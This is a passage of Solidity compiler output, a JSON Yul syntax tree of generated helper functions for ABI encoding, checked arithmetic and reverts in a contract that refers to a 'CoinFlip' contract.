															"nativeSrc": "958:86:2",
															"nodeType": "YulExpressionStatement",
															"src": "958:86:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_contract$_CoinFlip_$81__to_t_address__fromStack_reversed",
												"nativeSrc": "799:252:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "884:9:2",
														"nodeType": "YulTypedName",
														"src": "884:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "896:6:2",
														"nodeType": "YulTypedName",
														"src": "896:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "907:4:2",
														"nodeType": "YulTypedName",
														"src": "907:4:2",
														"type": ""
													}
												],
												"src": "799:252:2"
											},
											{
												"body": {
													"nativeSrc": "1102:32:2",
													"nodeType": "YulBlock",
													"src": "1102:32:2",
													"statements": [
														{
															"nativeSrc": "1112:16:2",
															"nodeType": "YulAssignment",
															"src": "1112:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "1123:5:2",
																"nodeType": "YulIdentifier",
																"src": "1123:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1112:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1112:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "1057:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1084:5:2",
														"nodeType": "YulTypedName",
														"src": "1084:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1094:7:2",
														"nodeType": "YulTypedName",
														"src": "1094:7:2",
														"type": ""
													}
												],
												"src": "1057:77:2"
											},
											{
												"body": {
													"nativeSrc": "1168:152:2",
													"nodeType": "YulBlock",
													"src": "1168:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1185:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1185:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1188:77:2",
																		"nodeType": "YulLiteral",
																		"src": "1188:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1178:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1178:6:2"
																},
																"nativeSrc": "1178:88:2",
																"nodeType": "YulFunctionCall",
																"src": "1178:88:2"
															},
															"nativeSrc": "1178:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "1178:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1282:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1282:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1285:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1285:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1275:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1275:6:2"
																},
																"nativeSrc": "1275:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1275:15:2"
															},
															"nativeSrc": "1275:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1275:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1306:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1306:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1309:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1309:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "1299:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1299:6:2"
																},
																"nativeSrc": "1299:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1299:15:2"
															},
															"nativeSrc": "1299:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1299:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nativeSrc": "1140:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "1140:180:2"
											},
											{
												"body": {
													"nativeSrc": "1371:149:2",
													"nodeType": "YulBlock",
													"src": "1371:149:2",
													"statements": [
														{
															"nativeSrc": "1381:25:2",
															"nodeType": "YulAssignment",
															"src": "1381:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "1404:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1404:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "1386:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "1386:17:2"
																},
																"nativeSrc": "1386:20:2",
																"nodeType": "YulFunctionCall",
																"src": "1386:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "1381:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "1381:1:2"
																}
															]
														},
														{
															"nativeSrc": "1415:25:2",
															"nodeType": "YulAssignment",
															"src": "1415:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "1438:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1438:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "1420:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "1420:17:2"
																},
																"nativeSrc": "1420:20:2",
																"nodeType": "YulFunctionCall",
																"src": "1420:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "1415:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "1415:1:2"
																}
															]
														},
														{
															"nativeSrc": "1449:17:2",
															"nodeType": "YulAssignment",
															"src": "1449:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "1461:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1461:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "1464:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1464:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nativeSrc": "1457:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1457:3:2"
																},
																"nativeSrc": "1457:9:2",
																"nodeType": "YulFunctionCall",
																"src": "1457:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nativeSrc": "1449:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "1449:4:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "1491:22:2",
																"nodeType": "YulBlock",
																"src": "1491:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nativeSrc": "1493:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "1493:16:2"
																			},
																			"nativeSrc": "1493:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1493:18:2"
																		},
																		"nativeSrc": "1493:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1493:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nativeSrc": "1482:4:2",
																		"nodeType": "YulIdentifier",
																		"src": "1482:4:2"
																	},
																	{
																		"name": "x",
																		"nativeSrc": "1488:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1488:1:2"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nativeSrc": "1479:2:2",
																	"nodeType": "YulIdentifier",
																	"src": "1479:2:2"
																},
																"nativeSrc": "1479:11:2",
																"nodeType": "YulFunctionCall",
																"src": "1479:11:2"
															},
															"nativeSrc": "1476:37:2",
															"nodeType": "YulIf",
															"src": "1476:37:2"
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nativeSrc": "1326:194:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "1357:1:2",
														"nodeType": "YulTypedName",
														"src": "1357:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "1360:1:2",
														"nodeType": "YulTypedName",
														"src": "1360:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nativeSrc": "1366:4:2",
														"nodeType": "YulTypedName",
														"src": "1366:4:2",
														"type": ""
													}
												],
												"src": "1326:194:2"
											},
											{
												"body": {
													"nativeSrc": "1554:152:2",
													"nodeType": "YulBlock",
													"src": "1554:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1571:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1571:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1574:77:2",
																		"nodeType": "YulLiteral",
																		"src": "1574:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1564:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1564:6:2"
																},
																"nativeSrc": "1564:88:2",
																"nodeType": "YulFunctionCall",
																"src": "1564:88:2"
															},
															"nativeSrc": "1564:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "1564:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1668:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1668:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1671:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1671:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1661:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1661:6:2"
																},
																"nativeSrc": "1661:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1661:15:2"
															},
															"nativeSrc": "1661:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1661:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "1692:1:2",
																		"nodeType": "YulLiteral",
																		"src": "1692:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1695:4:2",
																		"nodeType": "YulLiteral",
																		"src": "1695:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "1685:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1685:6:2"
																},
																"nativeSrc": "1685:15:2",
																"nodeType": "YulFunctionCall",
																"src": "1685:15:2"
															},
															"nativeSrc": "1685:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "1685:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nativeSrc": "1526:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "1526:180:2"
											},
											{
												"body": {
													"nativeSrc": "1754:143:2",
													"nodeType": "YulBlock",
													"src": "1754:143:2",
													"statements": [
														{
															"nativeSrc": "1764:25:2",
															"nodeType": "YulAssignment",
															"src": "1764:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "1787:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1787:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "1769:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "1769:17:2"
																},
																"nativeSrc": "1769:20:2",
																"nodeType": "YulFunctionCall",
																"src": "1769:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "1764:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "1764:1:2"
																}
															]
														},
														{
															"nativeSrc": "1798:25:2",
															"nodeType": "YulAssignment",
															"src": "1798:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "1821:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1821:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "1803:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "1803:17:2"
																},
																"nativeSrc": "1803:20:2",
																"nodeType": "YulFunctionCall",
																"src": "1803:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "1798:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "1798:1:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "1845:22:2",
																"nodeType": "YulBlock",
																"src": "1845:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nativeSrc": "1847:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "1847:16:2"
																			},
																			"nativeSrc": "1847:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "1847:18:2"
																		},
																		"nativeSrc": "1847:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "1847:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "1842:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1842:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "1835:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1835:6:2"
																},
																"nativeSrc": "1835:9:2",
																"nodeType": "YulFunctionCall",
																"src": "1835:9:2"
															},
															"nativeSrc": "1832:35:2",
															"nodeType": "YulIf",
															"src": "1832:35:2"
														},
														{
															"nativeSrc": "1877:14:2",
															"nodeType": "YulAssignment",
															"src": "1877:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "1886:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1886:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "1889:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "1889:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nativeSrc": "1882:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "1882:3:2"
																},
																"nativeSrc": "1882:9:2",
																"nodeType": "YulFunctionCall",
																"src": "1882:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nativeSrc": "1877:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "1877:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nativeSrc": "1712:185:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "1743:1:2",
														"nodeType": "YulTypedName",
														"src": "1743:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "1746:1:2",
														"nodeType": "YulTypedName",
														"src": "1746:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nativeSrc": "1752:1:2",
														"nodeType": "YulTypedName",
														"src": "1752:1:2",
														"type": ""
													}
												],
												"src": "1712:185:2"
											},
											{
												"body": {
													"nativeSrc": "1945:48:2",
													"nodeType": "YulBlock",
													"src": "1945:48:2",
													"statements": [
														{
															"nativeSrc": "1955:32:2",
															"nodeType": "YulAssignment",
															"src": "1955:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "1980:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "1980:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "1973:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "1973:6:2"
																		},
																		"nativeSrc": "1973:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "1973:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "1966:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "1966:6:2"
																},
																"nativeSrc": "1966:21:2",
																"nodeType": "YulFunctionCall",
																"src": "1966:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "1955:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "1955:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "1903:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "1927:5:2",
														"nodeType": "YulTypedName",
														"src": "1927:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "1937:7:2",
														"nodeType": "YulTypedName",
														"src": "1937:7:2",
														"type": ""
													}
												],
												"src": "1903:90:2"
											},
											{
												"body": {
													"nativeSrc": "2058:50:2",
													"nodeType": "YulBlock",
													"src": "2058:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2075:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "2075:3:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2095:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2095:5:2"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nativeSrc": "2080:14:2",
																			"nodeType": "YulIdentifier",
																			"src": "2080:14:2"
																		},
																		"nativeSrc": "2080:21:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2080:21:2"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2068:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2068:6:2"
																},
																"nativeSrc": "2068:34:2",
																"nodeType": "YulFunctionCall",
																"src": "2068:34:2"
															},
															"nativeSrc": "2068:34:2",
															"nodeType": "YulExpressionStatement",
															"src": "2068:34:2"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nativeSrc": "1999:109:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2046:5:2",
														"nodeType": "YulTypedName",
														"src": "2046:5:2",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "2053:3:2",
														"nodeType": "YulTypedName",
														"src": "2053:3:2",
														"type": ""
													}
												],
												"src": "1999:109:2"
											},
											{
												"body": {
													"nativeSrc": "2206:118:2",
													"nodeType": "YulBlock",
													"src": "2206:118:2",
													"statements": [
														{
															"nativeSrc": "2216:26:2",
															"nodeType": "YulAssignment",
															"src": "2216:26:2",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "2228:9:2",
																		"nodeType": "YulIdentifier",
																		"src": "2228:9:2"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2239:2:2",
																		"nodeType": "YulLiteral",
																		"src": "2239:2:2",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2224:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "2224:3:2"
																},
																"nativeSrc": "2224:18:2",
																"nodeType": "YulFunctionCall",
																"src": "2224:18:2"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "2216:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "2216:4:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "2290:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2290:6:2"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2303:9:2",
																				"nodeType": "YulIdentifier",
																				"src": "2303:9:2"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2314:1:2",
																				"nodeType": "YulLiteral",
																				"src": "2314:1:2",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2299:3:2",
																			"nodeType": "YulIdentifier",
																			"src": "2299:3:2"
																		},
																		"nativeSrc": "2299:17:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2299:17:2"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nativeSrc": "2252:37:2",
																	"nodeType": "YulIdentifier",
																	"src": "2252:37:2"
																},
																"nativeSrc": "2252:65:2",
																"nodeType": "YulFunctionCall",
																"src": "2252:65:2"
															},
															"nativeSrc": "2252:65:2",
															"nodeType": "YulExpressionStatement",
															"src": "2252:65:2"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nativeSrc": "2114:210:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2178:9:2",
														"nodeType": "YulTypedName",
														"src": "2178:9:2",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "2190:6:2",
														"nodeType": "YulTypedName",
														"src": "2190:6:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "2201:4:2",
														"nodeType": "YulTypedName",
														"src": "2201:4:2",
														"type": ""
													}
												],
												"src": "2114:210:2"
											},
											{
												"body": {
													"nativeSrc": "2370:35:2",
													"nodeType": "YulBlock",
													"src": "2370:35:2",
													"statements": [
														{
															"nativeSrc": "2380:19:2",
															"nodeType": "YulAssignment",
															"src": "2380:19:2",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2396:2:2",
																		"nodeType": "YulLiteral",
																		"src": "2396:2:2",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "2390:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2390:5:2"
																},
																"nativeSrc": "2390:9:2",
																"nodeType": "YulFunctionCall",
																"src": "2390:9:2"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "2380:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2380:6:2"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "2330:75:2",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "2363:6:2",
														"nodeType": "YulTypedName",
														"src": "2363:6:2",
														"type": ""
													}
												],
												"src": "2330:75:2"
											},
											{
												"body": {
													"nativeSrc": "2500:28:2",
													"nodeType": "YulBlock",
													"src": "2500:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2517:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2517:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2520:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2520:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "2510:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2510:6:2"
																},
																"nativeSrc": "2510:12:2",
																"nodeType": "YulFunctionCall",
																"src": "2510:12:2"
															},
															"nativeSrc": "2510:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "2510:12:2"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "2411:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "2411:117:2"
											},
											{
												"body": {
													"nativeSrc": "2623:28:2",
													"nodeType": "YulBlock",
													"src": "2623:28:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "2640:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2640:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2643:1:2",
																		"nodeType": "YulLiteral",
																		"src": "2643:1:2",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "2633:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2633:6:2"
																},
																"nativeSrc": "2633:12:2",
																"nodeType": "YulFunctionCall",
																"src": "2633:12:2"
															},
															"nativeSrc": "2633:12:2",
															"nodeType": "YulExpressionStatement",
															"src": "2633:12:2"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "2534:117:2",
												"nodeType": "YulFunctionDefinition",
												"src": "2534:117:2"
											},
											{
												"body": {
													"nativeSrc": "2697:76:2",
													"nodeType": "YulBlock",
													"src": "2697:76:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "2751:16:2",
																"nodeType": "YulBlock",
																"src": "2751:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "2760:1:2",
																					"nodeType": "YulLiteral",
																					"src": "2760:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "2763:1:2",
																					"nodeType": "YulLiteral",
																					"src": "2763:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "2753:6:2",
																				"nodeType": "YulIdentifier",
																				"src": "2753:6:2"
																			},
																			"nativeSrc": "2753:12:2",
																			"nodeType": "YulFunctionCall",
																			"src": "2753:12:2"
																		},
																		"nativeSrc": "2753:12:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "2753:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "2720:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "2720:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "2742:5:2",
																						"nodeType": "YulIdentifier",
																						"src": "2742:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nativeSrc": "2727:14:2",
																					"nodeType": "YulIdentifier",
																					"src": "2727:14:2"
																				},
																				"nativeSrc": "2727:21:2",
																				"nodeType": "YulFunctionCall",
																				"src": "2727:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "2717:2:2",
																			"nodeType": "YulIdentifier",
																			"src": "2717:2:2"
																		},
																		"nativeSrc": "2717:32:2",
																		"nodeType": "YulFunctionCall",
																		"src": "2717:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "2710:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "2710:6:2"
																},
																"nativeSrc": "2710:40:2",
																"nodeType": "YulFunctionCall",
																"src": "2710:40:2"
															},
															"nativeSrc": "2707:60:2",
															"nodeType": "YulIf",
															"src": "2707:60:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nativeSrc": "2657:116:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "2690:5:2",
														"nodeType": "YulTypedName",
														"src": "2690:5:2",
														"type": ""
													}
												],
												"src": "2657:116:2"
											},
											{
												"body": {
													"nativeSrc": "2839:77:2",
													"nodeType": "YulBlock",
													"src": "2839:77:2",
													"statements": [
														{
															"nativeSrc": "2849:22:2",
															"nodeType": "YulAssignment",
															"src": "2849:22:2",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "2864:6:2",
																		"nodeType": "YulIdentifier",
																		"src": "2864:6:2"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "2858:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2858:5:2"
																},
																"nativeSrc": "2858:13:2",
																"nodeType": "YulFunctionCall",
																"src": "2858:13:2"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "2849:5:2",
																	"nodeType": "YulIdentifier",
																	"src": "2849:5:2"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "2904:5:2",
																		"nodeType": "YulIdentifier",
																		"src": "2904:5:2"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nativeSrc": "2880:23:2",
																	"nodeType": "YulIdentifier",
																	"src": "2880:23:2"
																},
																"nativeSrc": "2880:30:2",
																"nodeType": "YulFunctionCall",
																"src": "2880:30:2"
															},
															"nativeSrc": "2880:30:2",
															"nodeType": "YulExpressionStatement",
															"src": "2880:30:2"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nativeSrc": "2779:137:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "2817:6:2",
														"nodeType": "YulTypedName",
														"src": "2817:6:2",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "2825:3:2",
														"nodeType": "YulTypedName",
														"src": "2825:3:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "2833:5:2",
														"nodeType": "YulTypedName",
														"src": "2833:5:2",
														"type": ""
													}
												],
												"src": "2779:137:2"
											},
											{
												"body": {
													"nativeSrc": "2996:271:2",
													"nodeType": "YulBlock",
													"src": "2996:271:2",
													"statements": [
														{
															"body": {
																"nativeSrc": "3042:83:2",
																"nodeType": "YulBlock",
																"src": "3042:83:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "3044:77:2",
																				"nodeType": "YulIdentifier",
																				"src": "3044:77:2"
																			},
																			"nativeSrc": "3044:79:2",
																			"nodeType": "YulFunctionCall",
																			"src": "3044:79:2"
																		},
																		"nativeSrc": "3044:79:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "3044:79:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3017:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3017:7:2"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "3026:9:2",
